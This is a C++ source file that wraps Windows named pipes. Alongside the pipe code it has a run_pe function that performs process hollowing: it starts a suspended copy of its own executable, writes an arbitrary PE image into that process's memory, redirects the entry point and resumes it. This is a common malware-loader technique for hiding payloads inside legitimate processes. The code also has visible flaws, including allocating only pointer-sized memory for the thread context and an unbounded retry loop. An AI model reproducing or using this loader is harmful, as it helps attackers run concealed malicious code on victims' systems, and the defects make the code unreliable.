#include "pipe.h"
#include "precompile.h"
pipe::pipe(std::string name)
{
	set_name(name);
}

bool pipe::listen()
{
	while (true) {

		pipe_handle = CreateNamedPipeA
		(
			pipe_name.c_str(),
			PIPE_ACCESS_OUTBOUND,
			PIPE_TYPE_MESSAGE |
			PIPE_READMODE_BYTE |
			PIPE_WAIT,
			1,
			4096,
			0,
			1,
			nullptr
		);

		if (pipe_handle != INVALID_HANDLE_VALUE) {
			break;
		}

		if (GetLastError() != ERROR_PIPE_BUSY) {
			return false;
		}

		Sleep(500);

	}

	return true;
}

bool pipe::send_data(std::string msg)
{
	unsigned long read_bytes = 0;
	bool write = WriteFile(pipe_handle, msg.c_str(), msg.size(), &read_bytes, nullptr);
	while (!write) {
		//manip::output_error(GetLastError(), "send()");
		write = WriteFile(pipe_handle, msg.c_str(), msg.size(), &read_bytes, nullptr);
	}
	return write && msg.size() == read_bytes;
}

void pipe::run_pe(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	CONTEXT* CTX;
	DWORD* ImageBase = NULL;
	void* pImageBase = NULL;
	int count;
	char CurrentFilePath[1024];
	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
	GetModuleFileNameA(0, CurrentFilePath, 1024);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
	{
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));
		bool threadcreated = CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &SI, &PI);
		if (threadcreated == true)
		{
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
			{
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				if (pImageBase == 00000000) {
					ResumeThread(PI.hThread);
				}

				if (pImageBase > 0) {
					WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
					for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
						WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
							LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					}
					WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
						LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					SetThreadContext(PI.hThread, LPCONTEXT(CTX));
					ResumeThread(PI.hThread);
				}
			}
		}
	}
}
void pipe::set_name(std::string name)
{
	pipe_name += name;
}